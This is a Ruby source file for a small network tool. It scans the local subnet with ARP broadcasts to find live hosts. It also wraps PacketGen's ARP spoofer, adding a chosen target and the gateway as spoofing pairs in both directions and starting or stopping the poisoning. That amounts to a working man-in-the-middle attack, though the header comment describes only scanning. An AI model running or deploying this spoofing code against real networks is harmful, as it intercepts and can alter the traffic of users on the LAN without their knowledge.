#!/usr/bin/env ruby

#This script scans the local network looking for alive hosts

require 'packetgen'
require 'packetgen/config'
require 'packetgen/utils'
require 'ip_admin'
require 'socket'

class ElisaCore
    attr_accessor :targetIp

    def initialize 
        config = PacketGen::Config.instance
        @iface = config.default_iface
        @ip = config.ipaddr
        @mac = config.hwaddr
        @gateway = `ip route show`[/default.*/][/\d+\.\d+\.\d+\.\d+/]
        @targetIp = nil

        #Getting the netmask
        @netmask = ""
        Socket.getifaddrs.each { | ifaddr |
            if ifaddr.addr.to_s == Addrinfo.ip(@ip).to_s
                @netmask = ifaddr.netmask.ip_unpack.shift
                break
            end
        }

        @spoofer = PacketGen::Utils::ARPSpoofer.new
    end

    def gateway
        @gateway
    end

    def printDeviceInfo 
        puts "---------Device Information---------"
        puts "Name: #{@iface}"
        puts "IP: #{@ip}"
        puts "Gateway: #{@gateway}"
        puts "Netmask: #{@netmask}"
        puts "MAC: #{@mac}"
        puts "------------------------------------"
    end

    def getIpLastDigits(anIp)
        dotIndex = anIp.rindex('.')
        digits = anIp[dotIndex+1..-1].to_i
        return digits
    end
    
    def getSortedAliveIps(ipHash)
        ipsArray = []
    
        ipHash.sort { |a,b| a[1] <=> b[1] }.each { |ipHashElem|
            ipsArray.push(ipHashElem[0])
        }
        return ipsArray
    end

    def getAliveIpsArray
        @aliveIpsArray
    end
    
    def startScan()
    
        #Build a CIDR
        cidr_mask = IPAdmin.unpack_ip_netmask(IPAdmin.pack_ip_netmask(@netmask))
        cidr = IPAdmin::CIDR.new("#{@ip}/#{cidr_mask}")
    
        #Getting all subnet IPs
        ipsToScan = cidr.enumerate
        #Get rid of base subnet IP, broadcast IP, gateway and our own IP
        ipsToScan.pop
        ipsToScan.shift
        ipsToScan.delete(@gateway)
        ipsToScan.delete(@ip)
    
        timeoutSecs = 20
        puts "Scanning... (this takes #{timeoutSecs} seconds)"
        #TODO - Config ready, it's time to scan
    
        thread = Thread.new {
            Thread.current['packets'] = PacketGen.capture(iface: @iface, 
                                                        promisc: true, 
                                                        filter: "arp dst #{@ip}", 
                                                        timeout: timeoutSecs)
        }
    
        ipsToScan.each { | scanIp |
    
                PacketGen::Packet.gen('Eth', src: @mac, dst: 'ff:ff:ff:ff:ff:ff')
                                .add('ARP', spa: @ip, 
                                            tpa: scanIp, 
                                            sha: @mac, 
                                            tha: 'ff:ff:ff:ff:ff:ff', 
                                            op: 'request')
                .to_w(@iface)
        }
    
        thread.join
        packets = thread['packets']
    
        aliveIps = Hash.new
        packets.each { | packet |
            aliveIps[packet.arp.spa] = getIpLastDigits(packet.arp.spa)
        }
    
        #Sometimes we capture an ARP message from gateway, so we delete gateway from results
        aliveIps.delete(@gateway)

        getSortedAliveIps(aliveIps).each { |aliveIp|
            puts "#{aliveIp} is up"
        }
    
        @aliveIpsArray = getSortedAliveIps(aliveIps)
    
    end

    def checkActiveSpoofings()
        activeTargets = @spoofer.active_targets
    
        if activeTargets.empty?
            puts "No active targets"
        else
            puts "Active targets:\n"
            activeTargets.each { |activeTarget|
                puts "#{activeTarget}\n"
            }
        end
    
    end

    def startSpoofing()
        @spoofer.start_all
    end

    def stopSpoofing()
        @spoofer.stop_all
    end

    def addTarget()
        return puts "No target selected\n" if @targetIp.nil?
    
        @spoofer.add(@targetIp,@gateway)
        @spoofer.add(@gateway,@targetIp)
    end
end 

